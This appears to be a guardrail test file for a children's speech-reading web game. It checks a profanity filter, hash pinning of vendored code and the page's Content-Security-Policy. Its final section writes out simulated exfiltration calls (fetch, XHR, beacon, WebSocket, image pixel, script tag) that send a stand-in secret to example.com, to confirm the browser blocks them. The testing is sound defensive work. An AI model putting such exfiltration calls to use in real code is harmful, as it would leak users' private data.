// The two promises this game makes to a family, tested as mechanisms rather than
// intentions:
//
//   1. Nothing personal leaves the device. Not "the current code does not try to send
//      anything" — that is what tests/privacy.test.mjs checks — but that the browser
//      REFUSES to send it, so a future mistake or a compromised dependency cannot.
//   2. No objectionable content reaches a child, including through the one door that
//      accepts free text: the sentences a grown-up types in.
//
//   pixi run -e dev test-guardrails

import { chromium } from 'playwright';
import { fileURLToPath } from 'node:url';
import { dirname, resolve } from 'node:path';
import { readFileSync } from 'node:fs';
import { createHash } from 'node:crypto';
import { ensureServer } from './server.mjs';

const here = dirname(fileURLToPath(import.meta.url));
const repo = resolve(here, '..');
const BASE = process.env.URL || 'http://localhost:8000';

let failures = 0;
function check(label, actual, expected = true) {
  const ok = JSON.stringify(actual) === JSON.stringify(expected);
  if (!ok) failures++;
  console.log(`${ok ? 'PASS' : 'FAIL'}  ${label}${ok ? '' : `  expected ${JSON.stringify(expected)}, got ${JSON.stringify(actual)}`}`);
}

const { unsafeWordsIn, isSafeForChildren, UNSAFE_WORDS } = await import('../js/safe-words.js');
const { checkCustomSentences } = await import('../js/store.js');

// --- content ------------------------------------------------------------
console.log('\n-- what a grown-up types is checked for meaning, not just spelling --');
{
  const ordinary = [
    'The dog sat on the step',
    'We went to the park',
    'My red bike is fast',
    'The grass is wet today',      // "grass" must not trip a substring match
    'She has a classic hat',       // nor "classic"
    'Nanna lives in Scunthorpe',   // the classic false positive
  ];
  const { sentences, problems } = checkCustomSentences(ordinary.join('\n'));
  check('ordinary sentences are accepted', sentences.length, ordinary.length);
  check('with no complaints', problems, []);

  for (const line of ['you are stupid', 'I hate my sister', 'the man was killed', 'he had a beer']) {
    const result = checkCustomSentences(line);
    check(`refused: "${line}"`, result.sentences.length === 0 && result.problems.length === 1);
  }
  check('the message names the word without repeating the whole line',
    /not for a young reader/.test(checkCustomSentences('you are stupid').problems[0]));

  // Spelling round the filter should not work.
  check('lookalike characters are resolved', unsafeWordsIn('sh1t and @ss').length, 2);
  check('plurals and endings are caught', unsafeWordsIn('idiots killing').length, 2);
  check('a clean sentence stays clean', isSafeForChildren('The cat is on my lap'));
  check(`the list is a real list, not a token one (${UNSAFE_WORDS.size} words)`, UNSAFE_WORDS.size > 100);

  // One bad line must not take the good ones with it, or a grown-up loses their work.
  const mixed = checkCustomSentences('The dog sat on the step\nyou are stupid\nWe went to the park');
  check('a bad line is reported without discarding the rest', mixed.problems.length, 1);
  check('and names which line it was', /Line 2/.test(mixed.problems[0]));
}

// --- what the page executes ---------------------------------------------
console.log('\n-- the vendored recognizer is the file it claims to be --');
{
  // 5.8MB of somebody else's WebAssembly runs in a child's browser. It is vendored
  // rather than installed so it can be read, which is only worth anything if a
  // change to it is noticed. See vendor/PROVENANCE.md.
  const expected = '29504515526e974f4cb053cf08811c4de5fb2a74007c0a5a957db50eaa8d5d0c';
  const actual = createHash('sha256').update(readFileSync(resolve(repo, 'vendor/vosk.js'))).digest('hex');
  check('vendor/vosk.js matches its recorded hash', actual, expected);

  const provenance = readFileSync(resolve(repo, 'vendor/PROVENANCE.md'), 'utf8');
  check('and its provenance records that same hash', provenance.includes(expected));
  check('naming the package and version it came from', /vosk-browser.*0\.0\.8/s.test(provenance));

  // The model is pinned too, in the script that downloads it.
  const fetcher = readFileSync(resolve(repo, 'tools/fetch_model.py'), 'utf8');
  check('the speech model download is pinned to a hash',
    /SOURCE_SHA256 = '[0-9a-f]{64}'/.test(fetcher));
  check('and the download is refused if it does not match',
    /if digest != SOURCE_SHA256/.test(fetcher) && /return 1/.test(fetcher));
}

// --- the policy itself ---------------------------------------------------
console.log('\n-- the page carries a policy that forbids talking to anyone else --');
{
  const html = readFileSync(resolve(repo, 'index.html'), 'utf8');
  const match = html.match(/http-equiv="Content-Security-Policy"\s+content="([^"]+)"/);
  check('index.html declares a Content-Security-Policy', Boolean(match));
  const policy = match ? match[1] : '';

  const directive = (name) => (policy.match(new RegExp(`${name} ([^;]*)`)) || [, ''])[1].trim();
  check(`connect-src allows only this origin (${directive('connect-src')})`,
    directive('connect-src').split(/\s+/).every((src) => ["'self'", 'blob:', 'data:'].includes(src)));
  check('default-src is none', directive('default-src'), "'none'");
  check('no directive allows an arbitrary host',
    /(^|\s)(\*|https?:(\/\/\*)?)(\s|;|$)/.test(policy), false);
  check('form submission is forbidden', directive('form-action'), "'none'");
  check('plugins are forbidden', directive('object-src'), "'none'");
}

// --- and the browser actually enforces it -------------------------------
console.log('\n-- every way of smuggling data out is refused by the browser --');
const stopServer = await ensureServer(BASE);
const browser = await chromium.launch({
  args: ['--use-fake-ui-for-media-stream', '--use-fake-device-for-media-stream'],
});
const context = await browser.newContext();

// A request being *initiated* proves nothing: CSP blocks it after that event fires.
// What matters is how it ended — refused by the policy, or actually put on the wire.
const attempts = new Map();
const isExternal = (url) => !url.startsWith(BASE) && !url.startsWith('data:') && !url.startsWith('blob:');
context.on('request', (r) => { if (isExternal(r.url())) attempts.set(r, { url: r.url(), method: r.method(), outcome: 'pending' }); });
context.on('requestfailed', (r) => { if (attempts.has(r)) attempts.get(r).outcome = r.failure()?.errorText || 'failed'; });
context.on('response', (r) => { const q = r.request(); if (attempts.has(q)) attempts.get(q).outcome = `RESPONSE ${r.status()}`; });

try {
  const page = await context.newPage();
  await page.goto(BASE, { waitUntil: 'load' });
  await page.waitForFunction(() => Boolean(window.__balloon));

  const outcomes = await page.evaluate(async () => {
    const secret = 'pretend-this-is-a-childs-voice';
    const result = {};
    const settle = (promise, ms = 2500) =>
      Promise.race([promise, new Promise((done) => setTimeout(() => done('blocked: timeout'), ms))]);

    result.fetch = await fetch(`https://example.com/collect?d=${secret}`)
      .then(() => 'ALLOWED').catch(() => 'blocked');
    result.xhr = await settle(new Promise((done) => {
      try {
        const x = new XMLHttpRequest();
        x.open('POST', 'https://example.com/collect');
        x.onload = () => done('ALLOWED');
        x.onerror = () => done('blocked');
        x.send(secret);
      } catch { done('blocked'); }
    }));
    result.beacon = (() => {
      try { return navigator.sendBeacon('https://example.com/collect', secret) ? 'queued' : 'blocked'; }
      catch { return 'blocked'; }
    })();
    result.websocket = await settle(new Promise((done) => {
      try {
        const ws = new WebSocket('wss://example.com/collect');
        ws.onopen = () => done('ALLOWED');
        ws.onerror = () => done('blocked');
      } catch { done('blocked'); }
    }));
    result.image = await settle(new Promise((done) => {
      const img = new Image();
      img.onload = () => done('ALLOWED');
      img.onerror = () => done('blocked');
      img.src = `https://example.com/pixel.png?d=${secret}`;
    }));
    result.script = await settle(new Promise((done) => {
      const el = document.createElement('script');
      el.onload = () => done('ALLOWED');
      el.onerror = () => done('blocked');
      el.src = 'https://example.com/tracker.js';
      document.head.append(el);
    }));
    result.webfont = await settle(new Promise((done) => {
      const el = document.createElement('link');
      el.rel = 'stylesheet';
      el.onload = () => done('ALLOWED');
      el.onerror = () => done('blocked');
      el.href = 'https://fonts.googleapis.com/css2?family=Roboto';
      document.head.append(el);
    }));
    return result;
  });

  await page.waitForTimeout(1500);

  const rows = [...attempts.values()];
  const refused = rows.filter((r) => /csp|BLOCKED_BY_CLIENT|BLOCKED_BY_RESPONSE/i.test(r.outcome));
  const reachedNetwork = rows.filter((r) => !/csp|BLOCKED_BY_CLIENT|BLOCKED_BY_RESPONSE/i.test(r.outcome));

  for (const [how, outcome] of Object.entries(outcomes)) {
    check(`${how} cannot reach another host`, outcome !== 'ALLOWED');
  }
  console.log(`      ${rows.length} attempts left the page; ${refused.length} refused by the policy`);
  check(`nothing reached the network (${reachedNetwork.map((r) => r.url.slice(0, 40)).join(', ') || 'none did'})`,
    reachedNetwork.length, 0);
} finally {
  await browser.close();
  stopServer();
}

console.log(failures ? `\n${failures} failing check(s)` : '\nAll guardrail checks passed');
process.exit(failures ? 1 : 0);
